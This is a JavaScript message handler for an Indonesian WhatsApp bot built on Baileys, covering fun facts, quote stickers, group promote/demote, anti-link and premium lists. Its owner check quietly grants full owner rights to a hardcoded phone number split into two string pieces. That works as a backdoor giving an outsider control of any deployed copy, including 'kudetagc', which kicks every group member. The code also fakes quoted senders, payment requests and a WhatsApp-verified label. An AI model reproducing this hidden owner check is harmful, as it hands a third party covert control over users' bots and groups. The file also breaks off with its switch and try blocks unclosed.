/*
This script was created by Arhiza bot
Developed By Eriza Official
Base Creator : Lezz DcodeR
*/

require("./settings")
const fs = require('fs')
const util = require('util')
const os = require('os')
const FileType = require('file-type')
const axios = require('axios')
const chalk = require('chalk')
const sharp = require('sharp')
const crypto = require('crypto')
const speed = require('performance-now')
const { runtime, formatp, tanggal, sleep, fetchJson } = require('./lib/func')
const { exec } = require("child_process")
module.exports = async (riza, m, store) => {
try {
const from = m.key.remoteJid
const { 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto, 
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
  } = require("@whiskeysockets/baileys")
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '.')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isPc = from.endsWith('@s.whatsapp.net')
const isCh = from.endsWith('@newsletter')
const isGroup = from.endsWith('@g.us')
const botNumber = await riza.decodeJid(riza.user.id)
const sender = m.key.fromMe ? (riza.user.id.split(':')[0]+'@s.whatsapp.net' || riza.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot || senderNumber === "6285659"+"202292";
const groupMetadata = isGroup 
  ? await riza.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false

const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)

//Fake Quoted
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `ꪎ ${global.ownername}`
}}}
const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Bot"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `ꪎ ${global.ownername}`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `ꪎ ${global.ownername}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}

// Random Image
const imageUrls = [
        "https://i.ibb.co/m944LxT/image.jpg",
        "https://i.ibb.co/mHSbM3d/image.jpg",
        "https://files.catbox.moe/g4ae8u.jpg",
        "https://files.catbox.moe/9vp33w.jpg",
        "https://files.catbox.moe/6s1c3e.jpg"
    ];
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];
    
// Reply
const replyz = (teks) => {
    return riza.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 1000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, {})
}

riza.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
}

// Tampilan Di Console
const figlet = require('figlet');

if (m.message && m.text && m.text.startsWith('.')) {
    figlet.text('ERIZA', {
        font: 'ANSI Shadow'
    }, (err, data) => {
        if (err) {
            console.log(chalk.red('Oops! Gagal membuat header figlet.'));
            return;
        }

        const line = chalk.cyan('══════════════════════════════════════════');

        console.log(
            '\n' + line + '\n' +
            chalk.cyanBright(data) + '\n' +  // Header dengan warna cyan terang

            chalk.bgGreen.black(' ▶  MESSAGE ') + chalk.greenBright(' │ ' + m.text) + '\n' +
            chalk.bgYellow.black(' ▶  SENDER  ') + chalk.yellowBright(' │ ' + m.sender) + '\n' +
            chalk.bgGreen.black(' ▶  TYPE    ') + chalk.greenBright(' │ ' + m.mtype) + '\n' +
            chalk.bgYellow.black(' ▶  CHAT    ') + (m.isGroup ? chalk.yellowBright(' │ GROUP CHAT') : chalk.yellowBright(' │ PRIVATE CHAT')) + '\n' +

            line + '\n'
        );
    });
}

// Gak Usah Di Apa Apain Jika Tidak Mau Error
let ppuser
try {
ppuser = await riza.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/2lw5hm.jpg'
}


let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false

if (Antilinkgc) {
 if (budy.match(`chat.whatsapp.com`)) {
 if (!isBotAdmins) return m.reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
 let gclink = (`https://chat.whatsapp.com/`+await riza.groupInviteCode(m.chat))
 let isLinkThisGc = new RegExp(gclink, 'i')
 let isgclink = isLinkThisGc.test(m.text)
 if (isgclink) return riza.sendMessage(m.chat, {text: `「 Group Link Detected 」: Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
 if (isAdmins) return riza.sendMessage(m.chat, {text: `「 Group Link Detected : Admin mengirimkan link, admin mah bebas memposting link apapun`})
 if (isCreator) return riza.sendMessage(m.chat, {text: `「 Group Link Detected 」: owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
 let kice = m.sender
 await riza.sendMessage(m.chat,
			 {
			 delete: {
			 remoteJid: m.chat,
			 fromMe: false,
			 id: m.key.id,
			 participant: m.key.participant
			 }
			 })
 riza.sendMessage(from, {text:`「 Tautan Terdeteksi 」@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } 
 }





 
 
switch (command) {
case 'faktaunik': {
const facts = [
'🧠 Otak manusia dapat menghasilkan listrik yang cukup untuk menyalakan lampu kecil!',
'🐼 Panda bisa menghabiskan sekitar 12 jam sehari hanya untuk makan bambu.',
'🌕 Di bulan, jejak kaki manusia bisa bertahan selama jutaan tahun karena tidak ada angin atau hujan.',
'🦄 Jerapah tidur hanya sekitar 10-30 menit sehari dan sering tidur sambil berdiri!',
'🎵 Musik dapat meningkatkan suasana hati dan membantu mengurangi stres.',
'🐢 Penyu sudah ada sejak zaman dinosaurus, sekitar lebih dari 200 juta tahun yang lalu.',
'🍫 Cokelat bisa memicu hormon endorfin yang membuat seseorang merasa bahagia.',
'🚀 Di luar angkasa, air mata tidak bisa jatuh karena gravitasi yang rendah!',
'🔮 Lebih dari 70% permukaan Bumi ditutupi oleh air.',
'🐝 Lebah bisa mengenali wajah manusia layaknya manusia mengenali wajah satu sama lain.',
'🐧 Penguin adalah satu-satunya burung yang bisa berenang tetapi tidak bisa terbang.',
'🦷 Gigi adalah satu-satunya bagian tubuh manusia yang tidak bisa memperbaiki dirinya sendiri.',
'🐌 Siput bisa tidur hingga 3 tahun lamanya!',
'🔑 Sidik jari koala sangat mirip dengan sidik jari manusia.',
'🌍 Bumi adalah satu-satunya planet yang tidak dinamai berdasarkan nama dewa atau dewi.',
'🐟 Ikan mas memiliki ingatan yang lebih baik daripada yang orang pikirkan, mereka bisa mengingat sesuatu hingga beberapa bulan.',
'🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang.',
'🎤 Hati manusia berdetak sekitar 100.000 kali sehari.',
'🌈 Tidak ada dua pelangi yang benar-benar sama, setiap orang melihat pelangi dengan sudut pandang berbeda.',
'📱 Lebih banyak orang di dunia memiliki akses ke ponsel daripada toilet bersih.',
'🌋 Di Islandia, ada lebih dari 100 gunung berapi aktif.',
'💧 Air panas bisa membeku lebih cepat daripada air dingin dalam kondisi tertentu (Efek Mpemba).',
'⚡ Petir lebih panas dari permukaan matahari.',
'🦩 Flamingo mendapatkan warna pink dari makanan yang mereka makan, yaitu udang.',
'🐇 Kelinci tidak bisa muntah.',
'🧊 Antartika adalah gurun terbesar di dunia meskipun tertutup es.',
'🐜 Semut tidak memiliki paru-paru, mereka bernapas melalui pori-pori kecil di tubuh mereka.',
'🌟 Cahaya dari bintang yang kita lihat mungkin sudah tidak ada lagi karena bintang tersebut bisa saja sudah mati.',
'🕷️ Laba-laba bisa menghasilkan sutra yang lebih kuat daripada baja dengan berat yang sama.',
'🐨 Koala tidur hingga 20 jam sehari.',
'🦁 Singa betina lebih sering berburu dibandingkan singa jantan.',
'🐍 Ular bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.',
'🧠 Otak manusia terdiri dari sekitar 75% air.',
'🐦 Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.',
'🎮 Bermain video game bisa meningkatkan koordinasi tangan dan mata.',
'📖 Orang yang membaca buku secara rutin cenderung lebih empatik dan mudah memahami perasaan orang lain.',
'🎭 Tertawa dapat meningkatkan sistem kekebalan tubuh.',
'🌠 Rata-rata ada 44 petir yang menyambar permukaan bumi setiap detik.',
'🦜 Burung beo bisa meniru suara manusia karena memiliki struktur otot vokal yang unik.',
'🐴 Kuda bisa tidur sambil berdiri.',
'🐶 Anjing bisa memahami lebih dari 150 kata manusia.',
'🌬️ Angin terkuat yang pernah tercatat di Bumi memiliki kecepatan 372 km/jam.',
'🍯 Madu adalah satu-satunya makanan yang tidak pernah basi.',
'🦀 Kepiting bisa berjalan ke samping karena struktur tubuh dan kakinya.',
'🌌 Ada lebih banyak bintang di alam semesta daripada butiran pasir di semua pantai di Bumi.',
'🐉 Komodo adalah kadal terbesar di dunia.',
'🏊‍♂️ Manusia bisa bertahan tanpa makanan selama berminggu-minggu, tetapi hanya beberapa hari tanpa air.',
'🦎 Jika ekor cicak putus, ekornya akan tumbuh kembali.',
'🚀 Sebagian besar debu di rumah berasal dari kulit mati manusia.'
];
const randomFact = facts[Math.floor(Math.random() * facts.length)];
m.reply(`🧠 *Fakta Unik*

${randomFact}`);
}
break;
case 'qc':{

if (!args[0] && !m.quoted) {
return m.reply(`Where is the text?`)
}
let userPfp
if (m.quoted) {
try {
userPfp = await riza.profilePictureUrl(m.quoted.sender, "image")
} catch (e) {
userPfp = imageUrls
}
} else {
try {
userPfp = await riza.profilePictureUrl(m.sender, "image")
} catch (e) {
userPfp = imageUrls
}
}
const waUserName = pushname
const quoteText = m.quoted ? m.quoted.body : args.join(" ")
const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      riza.sendImageAsSticker(m.chat, buffer, m, {
        packname: 'Eriza',
        author: 'Gamtenk',
      })
    } catch (error) {
      console.error(error)
      m.reply('Error')
    }
    }
break;
case 'openai':{
if (!text) return m.reply('Masukkan Pertanyaan Ai')
let theAi = `https://vapis.my.id/api/openai?q=${encodeURIComponent(text)}`
let fAi = await fetch(theAi)
let anu = await fAi.json()
riza.sendMessage(m.chat, {text: anu.result}, {quoted: qloc});
}
break
case 'demote': {

if (!m.isGroup) return m.reply('Khusus Dalam Grup!')
if (!isAdmins && !isCreator) return m.reply('Khusus Admin Grup!')
if (!isBotAdmins) return m.reply('Bot Harus Menjadi Admin!')
 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 await riza.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote');
m.reply('Sukses Demote 💡');
}
break
case 'promote': {

if (!m.isGroup) return m.reply('Khusus Dalam Grup!')
if (!isAdmins && !isCreator) return m.reply('Khusus Admin Grup!')
if (!isBotAdmins) return m.reply('Bot Harus Menjadi Admin!')
 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 await riza.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
m.reply('Sukses Promote ☑️')
}
break
case 'tagsw': {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let [id, ...teksArray] = text.split(' ');
 let teks = teksArray.join(' ');
 if (!id || !teks) {
 return m.reply(`Example: ${prefix + command} <group_id> Hello`);
 }
 let mediaContent = null;
 let msgOptions = {};
 const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
 const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
 const jids = [m.sender, id];
 if (quoted) {
 const mime = quoted.mtype || quoted.mediaType;
 if (mime?.includes('image')) {
 mediaContent = await m.quoted.download();
 msgOptions = {
 image: mediaContent,
 caption: teks || m.quoted.text || '',
 };
 } else if (mime?.includes('video')) {
 mediaContent = await m.quoted.download();
 msgOptions = {
 video: mediaContent,
 caption: teks || m.quoted.text || '',
 };
 } else {
 msgOptions = {
 text: teks || m.quoted.text || '',
 };
 }
 } else {
 msgOptions = {
 text: teks,
 };
 }
 await riza.sendMessage("status@broadcast", msgOptions, {
 backgroundColor: pickedColor,
 textArgb: 0xffffffff,
 font: 0,
 statusJidList: await (await riza.groupMetadata(id)).participants.map((a) => a.id),
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: jids.map((jid) => ({
 tag: "to",
 attrs: { jid: id },
 content: undefined,
 })),
 },
 ],
 },
 ],
 });
 m.reply("*[ ✅ ]* Sukses Membuat Status\n_Please Check Bot Status_");
}
break
case 'listgrup': {
 
 try {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 const chats = await riza.groupFetchAllParticipating();
 const groupArray = Object.values(chats);
 if (groupArray.length === 0) return riza.sendMessage(m.chat, { text: 'Tidak ada grup yang terdeteksi.' }, { quoted: m });
 let listText = 'List Grup yang Terdaftar:\n\n';
 groupArray.forEach((group, index) => {
 listText += `*${index + 1}.* ${group.subject}\n`;
 listText += `> ID Grup: ${group.id}\n`;
 listText += `> Creator: ${group.owner ? '@' + group.owner.split('@')[0] : 'Tidak diketahui'}\n`;
 listText += `> Dibuat: ${new Date(group.creation * 1000).toLocaleDateString('id-ID')}\n`;
 listText += `> Jumlah Member: ${group.participants.length} orang\n\n`;
 });
 riza.sendMessage(m.chat, { text: listText, mentions: groupArray.map(g => g.owner ? g.owner : '') }, { quoted: m });
 } catch (error) {
 console.error('Error mendapatkan daftar grup:', error);
 riza.sendMessage(m.chat, { text: 'Gagal mendapatkan daftar grup.' }, { quoted: m });
 }
}
break
case 'antilinkgc': {
 if (!isGroup) return m.reply('❗ *Khusus Group*')
 if (!isBotAdmins) return m.reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
 if (!isAdmins && !isCreator) return m.reply('Khusus Admin!!')

 if (args[0] === "on") {
 if (Antilinkgc) return m.reply('Already activated')
 ntlinkgc.push(from)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
 m.reply('Success in turning on antiwame in this group')

 var groupe = await riza.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })

 riza.sendMessage(from, {
 text: '「 ⚠️ AntilinkGc Active 」 Nobody is allowed to send group link in this group, one who sends will be kicked immediately!',
 contextInfo: { mentionedJid: [m.sender] }
 }, { quoted: m })

 } else if (args[0] === "off") {
 if (!Antilinkgc) return m.reply('Already deactivated')
 let off = ntlinkgc.indexOf(from)
 ntlinkgc.splice(off, 1)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
 m.reply('Success in turning off antilinkgc in this group')

 } else {
 let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: 'Hai ' + pushname + ' Silakan klik tombol di bawah untuk menggunakan *' + command + '* command'
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.botname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image: { url: global.imgthumb } }, { upload: riza.waUploadToServer })),
 title: 'Eriza Official',
 gifPlayback: true,
 subtitle: global.ownername,
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: `{
 "title":"PILIH ON/OFF ♨️",
 "sections":[{
 "title":"PILIH ON/OFF",
 "rows":[{
 "header":"HIDUPKAN ✅",
 "title":"MEMILIH",
 "description":"MENGHIDUPKAN ✅",
 "id":"${prefix + command} on"
 },
 {
 "header":"MEMATIKAN ❌",
 "title":"MEMILIH",
 "description":"MEMATIKAN ❌",
 "id":"${prefix + command} off"
 }]
 }]
 }`
 }
 ]
 }),
 contextInfo: {
 mentionedJid: [m.sender],
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran,
 serverMessageId: 143
 }
 }
 })
 }
 }
 }, { quoted: m })
 await riza.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 })
 }
}
break
case "kudetagc": {
if (!isGroup) return m.reply('Khusus Group Dengan Bot sebagai Adminnya')
if (!isBotAdmins) return m.reply('upss, bot belum jadi admin')
if (!isCreator) return m.reply('Khusus Owner')
const kusleep = async (ms) => {
 return new Promise(resolve => setTimeout(resolve, ms));
}
let groupMetadata = await riza.groupMetadata(m.chat)
let memberFilter = groupMetadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup : *Active*")
for (let i of memberFilter) {
await riza.groupParticipantsUpdate(m.chat, [i], 'remove')
await kusleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break
case 'menu': {
    const message = `_*Hai ${pushname} 👋🏻*_
> sᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴀsɪsᴛᴇɴ ᴅɪɢɪᴛᴀʟ ʏᴀɴɢ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ᴍᴇɴɢᴀᴋsᴇs ʙᴇʀʙᴀɢᴀɪ ɪɴғᴏʀᴍᴀsɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛsᴀᴘᴘ ᴅᴇɴɢᴀɴ ғɪᴛᴜʀ ғᴜɴɢsɪᴏɴᴀʟ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ ᴘᴀᴅᴀ ᴘʀᴏɢʀᴀᴍ ɪɴɪ, ᴍᴏʜᴏɴ ᴊᴀɴɢᴀɴ sᴘᴀᴍ ᴅᴀɴ ʟᴀᴘᴏʀ ᴀᴘᴀʙɪʟᴀ ᴛᴇʀᴅᴀᴘᴀᴛ ᴋᴇsᴀʟᴀʜᴀɴ, ᴛᴇʀɪᴍᴀᴋᴀsɪʜ.

╭─ \`▢ 𝗕𝗼𝘁 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
╭─────────────────── •
│ ➠ *Bot Name :* ${global.namabot}
│ ➠ *Creator :* ${global.ownername}
│ ➠ *Version :* ${global.botversion}
╰─────────────────── •`;

    // Membaca dan membuat daftar menu dari listmenu.json
    let listMenu = JSON.parse(fs.readFileSync('./lib/listmenu.json', 'utf8'));
    let menuText = `╭─ \`▢ 𝗗𝗮𝗳𝘁𝗮𝗿 𝗙𝗶𝘁𝘂𝗿\`\n╭─────────────────── •\n`;
listMenu.forEach(menu => {
    menuText += `│ ${global.simbol} ${prefix}${menu}\n`;
});
menuText += `╰─────────────────── •`;

    // Menambahkan daftar menu ke dalam pesan
    const fullMessage = `${message}\n\n${menuText}`;

    await riza.sendMessage(m.chat, {
        footer: `© Created By ${global.ownername}`,
        buttons: [
            {
                buttonId: `.owner`,
                buttonText: { displayText: '🌟 ᴏᴡɴᴇʀ ʙᴏᴛ ✨' },
                type: 1
            },
        ],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./© Eriza Official"),
        fileName: `${global.namabot}`,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 99999999,
        caption: fullMessage, // Mengirimkan pesan lengkap
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran
            },
            externalAdReply: {
                title: `${global.namabot}`,
                body: `Terverifikasi Oleh WhatsApp`,
                mediaType: 1,
                thumbnailUrl: global.imgthumb, 
                sourceUrl: global.linkSaluran,
                renderLargerThumbnail: true
            }
        }
    });
}
break;
case 'ping': {
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });

    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });

    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();

    let respon = `
*㆔ Response Speed:* ${latensi.toFixed(4)} _Second_  
ㆳ ${(oldd - neww).toFixed(2)} _Milliseconds_  
ㆳ *Runtime:* ${runtime(process.uptime())}

┌───────────────── •
│ *Info Server ㇀*  
│ *RAM:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
└───────────────── •

ㇴ *NodeJS Memory Usage*  
${Object.keys(used)
    .map((key, _, arr) => `> ${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`)
    .join('\n')}

${cpus[0] ? `ㆫ *Total CPU Usage*  
\`${cpus[0].model.trim()} (${cpu.speed} MHz)\`
${Object.keys(cpu.times)
    .map(type => `> *${(type + '*').padEnd(6)} : ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`)
    .join('\n')}

ㇴ *CPU Core(s) Usage (${cpus.length} Core CPU)*  
${cpus
    .map(
        (cpu, i) => `> [ ${i + 1} ] ${cpu.model.trim()} (${cpu.speed} MHz)  
${Object.keys(cpu.times)
    .map(type => `- *${(type + '*').padEnd(6)} : ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`)
    .join('\n')}`
    )
    .join('\n\n')}` : ''}
`;

    m.reply(respon);
}
break;
case 'self': {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam 
    riza.public = false
    m.reply(`*Switch To Mode :* \`Self\``)
}
break

case 'public': {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    riza.public = true
    m.reply(`*Switch To Mode :* \`Public\``)
}
break
case 'owner': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.owner}:+${global.owner}\nEND:VCARD`;

        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Kontak Owner Kami`,jpegThumbnail: ""}}}
            
        

        await riza.sendMessage(m.chat, { contacts: { displayName: global.ownername, contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak owner:", error);
    }
}
break
case "addprem": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
    let ceknya = await riza.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Added ${prrkek} To Database`)
}
break

case "delprem": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Removed ${ya} From Database`)
}
break

//End Case
default:
if ((budy.match) && ["tes","bot"].includes(budy)) {
m.reply(`🤖 *${global.namabot}* is now \`ACTIVE\` ✅`);

}

